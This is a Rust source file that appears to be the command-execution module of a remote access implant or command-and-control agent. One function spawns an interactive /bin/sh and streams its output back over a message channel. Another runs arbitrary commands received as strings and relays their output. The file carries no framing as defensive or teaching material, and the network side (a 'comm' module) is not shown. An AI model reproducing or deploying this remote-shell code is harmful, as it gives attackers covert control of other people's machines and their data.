use tokio::{io::*, process::*, sync::*, *};
use crate::comm;
use std::process::Stdio;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use std::{
    fs::File,
    io::{self,Write},
    os::unix::io::{AsRawFd, FromRawFd}
};

pub async fn spawn_shell(my_data:comm::MyProto, tx: tokio::sync::mpsc::Sender<comm::MyProto>, _shellrx: tokio::sync::mpsc::Receiver<String>){       
        let mut shell = Command::new("/bin/sh").arg("-i").stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().unwrap();
        let shellin = Some(shell.stdin.take().unwrap());
        
        tokio::spawn(async move {
            let mut shellout = shell.stdout.take().unwrap();
            loop {
                let mut buf = [0; 1024];
                select! {


                    r = shellout.read(&mut buf) => {
                        let n = r.unwrap();
                        let output_data: comm::MyProto = comm::MyProto{
                            data: String::from_utf8(buf[..n].to_vec()).unwrap(),
                            message_type: "shell".to_string(),
                            channel: "1".to_string()};
                        
                            if output_data.data != ""{
                                match tx.send(output_data).await {
                                    Ok(()) => {},
                                    Err(err) => panic!("Channel Broken: {}", err)
                                }
                            }
                            
                        
                    }
                }
            }
        });       
        shellin.unwrap().write_all(my_data.data.as_bytes()).await.unwrap();
    }
        




pub async fn run_command(my_data: comm::MyProto, tx: tokio::sync::mpsc::Sender<comm::MyProto> ){
    let command: Vec<&str> = my_data.data.split(" ").collect();
    
    // Get command output
    let command_output = Command::new(command[0]).args(command.iter().skip(1)).output().await.ok();
    if command_output != None {
        let command_output = command_output.unwrap();

        // Create object using output
        let output_data: comm::MyProto = comm::MyProto{
            data: std::str::from_utf8(&command_output.stdout).unwrap().to_string(),
            message_type: "command output".to_string(),
            channel: "1".to_string()};

        match tx.send(output_data).await{
            Ok(()) => {},
            Err(err) => panic!("Channel Broken: {}", err)
            }
    // Something went wrong running command            
    }else{
        let output_data: comm::MyProto = comm::MyProto{
            data: String::from("Failed to run command"),
            message_type: "command output".to_string(),
            channel: "1".to_string()};

        match tx.send(output_data).await{
            Ok(()) => {},
            Err(err) => panic!("Channel Broken: {}", err)
            }
        }

    
}


